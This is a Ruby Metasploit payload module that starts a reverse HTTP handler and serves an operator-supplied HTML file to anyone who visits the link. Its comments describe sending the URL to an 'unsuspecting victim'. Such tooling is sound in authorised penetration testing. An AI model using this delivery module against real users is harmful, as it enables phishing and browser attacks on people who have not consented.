# Module to send a simple HTML payload back to an unsuspecting victim.
#
# Usage:
#
#   msf6 > use payload/html/html_reverse_http
#   msf6 payload(html/html_reverse_http) > set LHOST 0.0.0.0
#   msf6 payload(html/html_reverse_http) > set PAYLOADFILE poc.html
#   msf6 payload(html/html_reverse_http) > to_handler
#   [*] Payload Handler Started as Job 0
#   [*] Started HTTP reverse handler on http://0.0.0.0:8080
#
# Send the URL to the unsuspecting victim, and when they visit the
# link they will be served the HTML payload.
#
# Based on the `shell_reverse_tcp` payload.
#
require 'date'

module MetasploitModule

  CachedSize = 0

  include Msf::Payload::Single
  include Msf::Payload::Generic

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Generic HTML payload, Reverse HTTP.',
      'Description'   => 'Connect back to attacker and return HTML payload',
      'Author'        => 'harald.eilertsen@automattic.com',
      'License'       => GPL_LICENSE,
      'Handler'       => Msf::Handler::ReverseHttp,
      ))

    register_options([
      OptPath.new('PAYLOADFILE', [ true, 'The html payload to send in the response.'])
    ])
  end


  def on_request(cli, req)
    Thread.current[:cli] = cli
    resp = Rex::Proto::Http::Response.new

    resp.body = IO.read( datastore['PAYLOADFILE'] )
    resp.code = 200
    resp.message = 'OK'

    print_status("Request processed at #{DateTime.now.iso8601}")
    cli.send_response(resp)

    # Force this socket to be closed
    self.service.close_client(cli)
  end
end
